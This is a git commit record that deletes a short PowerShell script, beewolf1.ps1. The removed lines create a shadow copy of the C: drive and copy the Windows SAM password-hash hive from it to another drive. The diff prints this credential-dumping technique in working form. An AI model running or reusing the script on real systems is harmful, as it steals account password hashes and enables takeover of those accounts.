7723102898c04f75a61047beddb21047f33e1270
InnocentConclusion <59714595+InnocentConclusion@users.noreply.github.com>
2021-09-30 17:22:45 -0400

    Delete beewolf1.ps1

--- beewolf1.ps1
+++
@@ -1,6 +0,0 @@
-$syslink1 = (Get-WmiObject -List Win32_ShadowCopy).Create("C:\\", "ClientAccessible")
-$syslink2 = Get-WmiObject Win32_ShadowCopy | Where-Object { $_.ID -eq $syslink1.ShadowID }
-$directory = $syslink2.DeviceObject + "\\"
-cmd /c mklink /d C:\shadowcopy "$directory"
-copy-item -path "C:\shadowcopy\windows\system32\config\SAM" -destination "D:\" -Recurse
-cmd /c rmdir C:\shadowcopy
